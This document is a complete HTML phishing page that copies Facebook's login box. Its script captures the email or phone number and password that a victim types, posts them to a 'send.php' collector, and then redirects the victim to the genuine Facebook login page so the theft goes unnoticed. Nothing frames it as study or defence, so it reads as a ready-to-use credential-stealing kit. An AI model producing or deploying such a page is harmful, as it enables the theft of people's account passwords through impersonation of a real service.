<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="login-box">
  <h1>facebook</h1>
  <form id="loginForm">
    <input type="text" placeholder="Email or Phone" name="email" required>
    <input type="password" placeholder="Password" name="password" required>
   
    <button type="submit">Log In</button>
    
   
    <div class="links">
      <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten Password?</a>
      <a href="https://www.facebook.com/r.php?entry_point=login">Create New Account</a>
    </div>
  </form>
</div>

<script>
  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = new FormData(this);

    fetch('send.php', {
      method: 'POST',
      body: formData
    })
    .then(res => res.text())
    .then(data => {
      alert(data); // Optional: দেখানোর জন্য
      window.location.href = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ3NDAyMjkwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'; // Redirect after sending
    });
  });
</script>

</body>
</html>
